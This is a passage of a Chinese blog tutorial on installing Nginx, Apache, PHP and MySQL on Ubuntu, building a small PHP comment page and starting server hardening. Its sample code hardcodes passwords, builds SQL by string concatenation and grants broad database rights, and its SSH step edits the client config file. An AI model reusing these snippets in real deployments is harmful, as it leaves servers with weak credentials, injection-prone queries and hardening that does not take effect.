class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#让其支持php</span></span><br><span class="line">vi /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure><p>此行增加index.php</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/OiYhyqUDEHl4z3M.png" alt="image-20201023215217976"></p><p>去掉下面部分的注释用于支持php脚本,去掉注释后如下:</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/ayTLGlxUWXJfF7z.png" alt="image-20201023221149743"></p><p>重启nginx（在修改配置文件后需重启服务）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service nginx restart</span><br></pre></td></tr></table></figure><h2 id="查看PHP相关信息"><a href="#查看PHP相关信息" class="headerlink" title="查看PHP相关信息"></a>查看PHP相关信息</h2><p>在访问目录下创建phpinfo.php文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /var/www/html/</span><br></pre></td></tr></table></figure><p>编辑</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后浏览器中访问<code> localhost/phpinfo.php</code></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/NLXfVKwi5W3UoZy.png" alt="image-20201031201415794"></p><h2 id="配置虚拟主机"><a href="#配置虚拟主机" class="headerlink" title="配置虚拟主机"></a>配置虚拟主机</h2><p>创建一个test文件(虚拟主机配置文件)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;test</span><br></pre></td></tr></table></figure><p>编辑如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">       listen 80;</span><br><span class="line">       listen [::]:80;</span><br><span class="line"></span><br><span class="line">       server_name example.com;</span><br><span class="line"></span><br><span class="line">       root &#x2F;var&#x2F;www&#x2F;example.com;</span><br><span class="line">       index index.html;</span><br><span class="line"></span><br><span class="line">       location &#x2F; &#123;</span><br><span class="line">               try_files $uri $uri&#x2F; &#x3D;404;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>配置域名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;hosts</span><br></pre></td></tr></table></figure><p>增加一行：127.0.0.1    example.com</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/gKI5qMRse9xPDLo.png" alt="image-20201031203722330"></p><p>创建一个软链接到 <code>/etc/nginx/sites-enabled/</code>目录下,使配置文件生效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;test &#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;</span><br></pre></td></tr></table></figure><p>在 <code>/var/www/example.com</code>中创建一个 <code>index.html</code>，内容自定义，重启nginx，访问地址得到</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/WQcDK73TIynb6a8.png" alt="image-20201031205422671"></p><h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h1><h2 id="安装apache2"><a href="#安装apache2" class="headerlink" title="安装apache2"></a>安装apache2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install apache2</span><br></pre></td></tr></table></figure><p>查看apache版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apache2 -v</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/Hv6IhwSQXP7dAzG.png" alt="image-20201024172309352"></p><p>安装php apache mod</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libapache2-mod-php</span><br></pre></td></tr></table></figure><p>安装php插件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php7.4-mysql php7.4-curl php7.4-gd php7.4-mbstring php7.4-zip </span><br></pre></td></tr></table></figure><h2 id="访问apache2页面"><a href="#访问apache2页面" class="headerlink" title="访问apache2页面"></a>访问apache2页面</h2><p>如果之前开启了Nginx服务，为避免冲突，需关闭Nginx，再打开apache</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service nginx stop</span><br><span class="line">service apache2 start</span><br></pre></td></tr></table></figure><p>访问 <code>localhost</code> </p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/SWsLDPz2uX4BMIb.png" alt="image-20201031205925779"></p><h2 id="查看PHP相关信息-1"><a href="#查看PHP相关信息-1" class="headerlink" title="查看PHP相关信息"></a>查看PHP相关信息</h2><p>在 <code>/var/www/html/</code> 创建 <code>phpinfo.php</code> ，  访问localhost/phpinfo.php</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/jCUKNYfocs7ku1I.png" alt="image-20201031211242600"></p><h2 id="配置虚拟主机-1"><a href="#配置虚拟主机-1" class="headerlink" title="配置虚拟主机"></a>配置虚拟主机</h2><p>修改文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;000-default.conf </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line"></span><br><span class="line">ServerAdmin webmaster@localhost</span><br><span class="line">DocumentRoot &#x2F;var&#x2F;www&#x2F;html&#x2F;project</span><br><span class="line">ServerName www.youwen.com</span><br><span class="line"></span><br><span class="line">ErrorLog $&#123;APACHE_LOG_DIR&#125;&#x2F;error.log</span><br><span class="line">CustomLog $&#123;APACHE_LOG_DIR&#125;&#x2F;access.log combined</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>重启apache</p><p>然后配置域名,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;hosts</span><br></pre></td></tr></table></figure><p>增加一行如下:</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/bG1F2M5LX9ETODS.png" alt="image-20201026231143988"></p><p>在先前路径文件下创建index.php文件,编辑如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;var&#x2F;www&#x2F;html&#x2F;project&#x2F;index.php</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/DvwdQ1fZczeoisW.png" alt="image-20201026231450732"></p><p>打开浏览器,访问 <a href="http://www.youwen.com/">www.youwen.com</a> 可见</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/I7YRjuQP6gNSU8v.png" alt="image-20201031213933587"></p><h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h2 id="安装MySQL"><a href="#安装MySQL" class="headerlink" title="安装MySQL"></a>安装MySQL</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install mysql-server mysql-client</span><br></pre></td></tr></table></figure><p>安装后进行初始化操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_secure_installation </span><br></pre></td></tr></table></figure><p>–为root用户设置密码<br>–删除匿名账号<br>–取消root用户远程登录<br>–删除test库和对test库的访问权限<br>–刷新授权表使修改生效</p><h2 id="登录MySQL"><a href="#登录MySQL" class="headerlink" title="登录MySQL"></a>登录MySQL</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/Fqc9rSLX1D8UK3Z.png" alt="image-20201024203846140"></p><p>查看数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW DATABASES;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/duwv794bxMV2SyD.png" alt="image-20201101161119257"></p><p>退出 <code>quit</code></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/b1Vv9aYjNLOrUKu.png" alt="image-20201024203932154"></p><h2 id="php连接mysql"><a href="#php连接mysql" class="headerlink" title="php连接mysql"></a>php连接mysql</h2><p>在能够访问并处理数据库中的数据之前，必须创建到达数据库的连接。</p><p>在 PHP 中，这个任务通过 mysqli_connect() 函数完成。</p><p>连接方式    MySQLi - 面向过程</p><p>在 /var/www/html/project 创建connect.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost &#x3D; &#39;localhost&#39;;  &#x2F;&#x2F; mysql服务器主机地址</span><br><span class="line">$dbuser &#x3D; &#39;debian-sys-maint&#39;;            &#x2F;&#x2F; mysql用户名</span><br><span class="line">$dbpass &#x3D; &#39;PGpiTZ2V1aeDHuZg&#39;;          &#x2F;&#x2F; mysql用户名密码</span><br><span class="line">$conn &#x3D; mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#39;Could not connect: &#39; . mysqli_error());</span><br><span class="line">&#125;</span><br><span class="line">echo &#39;数据库连接成功！&#39;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;         </span><br></pre></td></tr></table></figure><p>安装后默认用户的用户名及密码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;mysql&#x2F;debian.cnf</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/JKNwX7sTF29RZ6q.png" alt="image-20201030183122653"></p><p>验证</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/tn8DE5mohjJ4GCI.png" alt="image-20201030182730755"></p><h1 id="Web环境简单利用"><a href="#Web环境简单利用" class="headerlink" title="Web环境简单利用"></a>Web环境简单利用</h1><p>进一步完善Apache配置的虚拟主机，使其显示一张图片，图片下方带有评论输入框，可以提交评论，提交的评论存到主机的 mysql 数据库中，而后显示在评论区，最后完成的大致如下图，是简陋了点。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304111640438.png" alt="image-20210304111640438"></p><h2 id="设置mysql"><a href="#设置mysql" class="headerlink" title="设置mysql"></a>设置mysql</h2><p>在 mysql 中创建一个新用户，并授权 INSERT、SELECT 等权限，评论内容需要存到数据库，并读取数据库内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建新用户wyw并设置密码</span></span><br><span class="line">mysql&gt;</span><br><span class="line">CREATE USER <span class="string">&#x27;wyw&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED BY <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"><span class="comment"># 为用户授权</span></span><br><span class="line">GRANT INSERT,SELECT ON *.* TO <span class="string">&#x27;wyw&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"><span class="comment"># 刷新</span></span><br><span class="line">FLUSH PRIVILENGE;</span><br></pre></td></tr></table></figure><p>退出mysql，以新创建的用户重新登陆</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u wyw -p</span><br></pre></td></tr></table></figure><p>创建一个库和表并插入数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create database webdb;</span><br><span class="line">use webdb;</span><br><span class="line">create table comments (id int auto_increment primary key,comment varchar(200) not null);</span><br><span class="line">insert into comments(comment) values (&#39;test&#39;);</span><br></pre></td></tr></table></figure><h2 id="连接mysql"><a href="#连接mysql" class="headerlink" title="连接mysql"></a>连接mysql</h2><p>编写<code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line"> &lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line"> &lt;style&gt;</span><br><span class="line"> .<span class="built_in">error</span> &#123;color: <span class="comment">#FF0000;&#125;</span></span><br><span class="line"> img &#123;</span><br><span class="line">     width: <span class="number">30</span>%;</span><br><span class="line">     height: auto;</span><br><span class="line"> &#125;</span><br><span class="line"> td &#123;</span><br><span class="line">     border: <span class="number">1</span>px solid black;</span><br><span class="line"> &#125;</span><br><span class="line"> &lt;/style&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt; </span><br><span class="line"></span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;connect.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"> <span class="variable">$comment</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"> <span class="variable">$commentErr</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;comment&quot;</span>])) &#123;</span><br><span class="line">     <span class="variable">$commentErr</span> = <span class="string">&quot;You must write someting...&quot;</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="variable">$comment</span> = test_input(<span class="variable">$_POST</span>[<span class="string">&quot;comment&quot;</span>]);</span><br><span class="line">     <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO comments (comment) VALUES (&#x27;&quot;</span>.<span class="variable">$comment</span>.<span class="string">&quot;&#x27;)&quot;</span>;</span><br><span class="line">     <span class="keyword">if</span> (mysqli_query(<span class="variable">$dbcon</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">         <span class="variable">$commentErr</span> = <span class="string">&quot;Submit comment successfully!&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="variable">$commentErr</span> = <span class="string">&quot;Error:&quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . mysqli_error(<span class="variable">$dbcon</span>);</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">test_input</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">   <span class="variable">$data</span> = trim(<span class="variable">$data</span>);</span><br><span class="line">   <span class="variable">$data</span> = stripslashes(<span class="variable">$data</span>);</span><br><span class="line">   <span class="variable">$data</span> = htmlspecialchars(<span class="variable">$data</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"> &lt;h1&gt;Wawyw<span class="string">&#x27;s HomePage&lt;/h1&gt;</span></span><br><span class="line"><span class="string"> &lt;img src=&#x27;</span>https:<span class="comment">//images-1304906399.cos.ap-guangzhou.myqcloud.com/images/wallpaper.png&#x27; alt=&#x27;homepage image&#x27;&gt;</span></span><br><span class="line"> &lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;&lt;?php echo htmlspecialchars(<span class="subst">$_SERVER</span>[&quot;</span>PHP_SELF<span class="string">&quot;]);?&gt;&quot;</span>&gt;</span><br><span class="line">   &lt;hr&gt;</span><br><span class="line">   &lt;p&gt;Wirte your comment here!&lt;/p&gt;</span><br><span class="line">   &lt;textarea name=<span class="string">&quot;comment&quot;</span> rows=<span class="string">&quot;5&quot;</span> cols=<span class="string">&quot;80&quot;</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$comment</span>;<span class="meta">?&gt;</span>&lt;/textarea&gt;</span><br><span class="line">   &lt;span class=&#x27;error&#x27;&gt;*&lt;?php echo $commentErr; ?&gt;&lt;/span&gt;</span><br><span class="line">   &lt;br&gt;&lt;/br&gt;</span><br><span class="line">   &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">   &lt;hr&gt;</span><br><span class="line"> &lt;/form&gt;</span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$sqlget</span> = <span class="string">&quot;SELECT * FROM comments&quot;</span>;</span><br><span class="line"> <span class="variable">$sqldata</span> = mysqli_query(<span class="variable">$dbcon</span>, <span class="variable">$sqlget</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Fail to connect to database!&quot;</span> .  mysqli_error(<span class="variable">$dbcon</span>));</span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;&lt;table&gt;&quot;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;th&gt;Comments&lt;/th&gt;&lt;/tr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">while</span>(<span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$sqldata</span>, MYSQLI_ASSOC)) &#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>;</span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;comment&#x27;</span>];</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;&lt;/table&gt;&quot;</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"> &lt;/body&gt;</span><br><span class="line"> &lt;/html&gt;</span><br></pre></td></tr></table></figure><p>对<code>connect.php</code>进行修改</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dbhost</span> = <span class="string">&#x27;localhost&#x27;</span>; </span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&#x27;wyw&#x27;</span>;          </span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&#x27;webdb&#x27;</span>;</span><br><span class="line"><span class="variable">$dbcon</span> = mysqli_connect(<span class="variable">$dbhost</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="variable">$dbcon</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysqli_error());</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close(<span class="variable">$conn</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在网页中测试，提交评论，并能够显示</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304124121221.png" alt="image-20210304124121221"></p><h1 id="Web服务器加固"><a href="#Web服务器加固" class="headerlink" title="Web服务器加固"></a>Web服务器加固</h1><h2 id="加固Linux系统"><a href="#加固Linux系统" class="headerlink" title="加固Linux系统"></a>加固Linux系统</h2><p><strong>时刻保持系统和软件为最新版本</strong></p><p>在 Ubuntu 中检查系统需要更新的软件包，使用如下命令，<code>apt-get -s</code> 命令用于模拟后面命令的操作，但实际不会改变系统的状态，所以 <code>apt-get -s upgrade</code> 只会模拟软件更新的过程，你会看到被更新的软件的信息，但实际并没有更新到系统上 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get -s upgrade</span><br></pre></td></tr></table></figure><p>然后根据需要更新你想要更新的软件。如果想更新所有软件，使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get upgrade</span><br></pre></td></tr></table></figure><p><strong>加固远程登陆</strong></p><p>在使用和管理服务器时，往往我们需要远程登陆服务器，这就需要我们保证远程登陆过程的安全性。以下步骤一定程度提高了远程登陆的安全性。</p><ol><li>强制使用高强度用户密码（数字、字母、字符的组合且长度14位以上）</li><li>更改 SSH 默认的端口（22）为随机端口</li><li>禁止 root 身份的远程登陆</li><li>使用公钥认证机制进行远程登陆</li><li>使用 Linux 标准用户而不是 root 用户执行上述操作，并且该用户的权限可提升成 root 权限</li></ol><p>现以 Ubuntu 系统为例，完成上述操作：</p><p><strong>强制使用高强度用户密码</strong></p><p>要强制用户使用高强度密码，需要安装额外的模块 <code>libpam-cracklib</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libpam-cracklib</span><br></pre></td></tr></table></figure><p>在 Ubuntu 中，密码策略（规定密码的长度，字符等）定义在 <code>/etc/pam.d/common-password</code> 文件中，如果要规定，密码长度为 14，包含大小写字符数字和字符，在文件中，在 <code>pam_unix.so</code>的前一行，添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password required pam_cracklib.so try_first_pass retry&#x3D;3 minlen&#x3D;14 lcredit&#x3D;-1 ucredit&#x3D;-1 dcredit&#x3D;-1 ocredit&#x3D;-1 difok&#x3D;2 reject_username</span><br></pre></td></tr></table></figure><p>上述配置的选项的描述如下，详情参考 <a href="http://www.linux-pam.org/Linux-PAM-html/sag-pam_cracklib.html">libpam-cracklib 文档</a>：</p><table><thead><tr><th>选项</th><th>描述</th></tr></thead><tbody><tr><td>retry=N</td><td>设置密码时的，最大重试次数</td></tr><tr><td>minlen=N</td><td>新密码的最小长度</td></tr><tr><td>lcredit=N</td><td>最少小写字母数，小于0，正常计算 minlen，大于0，计算 minlen 额外加 1</td></tr><tr><td>ucredt=N</td><td>最少大写字母数，小于0，正常计算 minlen，大于0，计算 minlen 额外加 1</td></tr><tr><td>dcredit=N</td><td>最少数字的数，小于0，正常计算 minlen，大于0，计算 minlen 额外加 1</td></tr><tr><td>ocredit=N</td><td>最少其它字符数，小于0，正常计算 minlen，大于0，计算 minlen 额外加 1</td></tr><tr><td>difok=N</td><td>和旧密码不同的字符数</td></tr><tr><td>reject_username</td><td>禁止用户名作为密码</td></tr></tbody></table><p>总之规定各种字符类型的个数，要使用负数，其绝对值表示该类型字符至少有多少个。</p><p><strong>更改 SSH 默认的端口（22）为随机端口</strong></p><p><strong>禁止 root 身份的远程登陆</strong></p><p>修改 ssh-server 的配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim &#x2F;etc&#x2F;ssh&#x2F;ssh_config</span><br></pre></td></tr></table></figure><p>找到 <code># Port 22</code> 更改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Port 2019</span><br></pre></td></tr></table></figure><p>找到 <code>#PermitRootLogin</code>，更改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PermitRootLogin no</span><br></pre></td></tr></table></figure><p>远程登陆则需要指定该端口执行登陆，而且无法使用 root 用户登陆</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh username@ip-addr -p 2019</span><br></pre></td></tr></table></figure><p><strong>使用公钥认证机制进行远程登陆</strong></p><p>SSH 登陆 提供<a href="https://www.linode.com/docs/security/authentication/use-public-key-authentication-with-ssh/">公钥认证机制</a>的登陆，即不需要密码的登陆方式，但是需要客户端生成公钥和私钥，并将公钥发送给服务端，服务端将公钥添加到相应用户的配置文件中。</p><p>首先客户端需要生成，密钥对：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096</span><br></pre></td></tr></table></figure><p>使用默认文件名，一路 <strong>Enter</strong> 最后，生成的密钥对文件在 <code>~/.ssh/</code> 目录下，其中 <code>id_rsa</code> 为私钥，<code>id_rsa.pub</code> 为公钥。</p><p>接着使用将公钥文件上传到服务器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-copy-id username@ip-addr -p portnum</span><br></pre></td></tr></table></figure><p>该命令会把公钥文件的内容，写入到 <code>/home/username/ssh/authorized_keys</code> 文件中，所以也可以手动添加内容。如此一来就可以 <code>username</code> 的身份，不使用密码登陆服务器了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 2019 username@ip-addr</span><br></pre></td></tr></table></figure><h2 id="加固Nginx"><a href="#加固Nginx" class="headerlink" title="加固Nginx"></a>加固Nginx</h2><p><strong>防止信息泄露</strong></p><p>Nginx 默认开启 Server Token（显示版本号），这样使得 Nginx 的版本号很容易被获取，如下图为连接域名不存在资源时的返回页面，可以看到 Nginx 的版本号</p><p><img 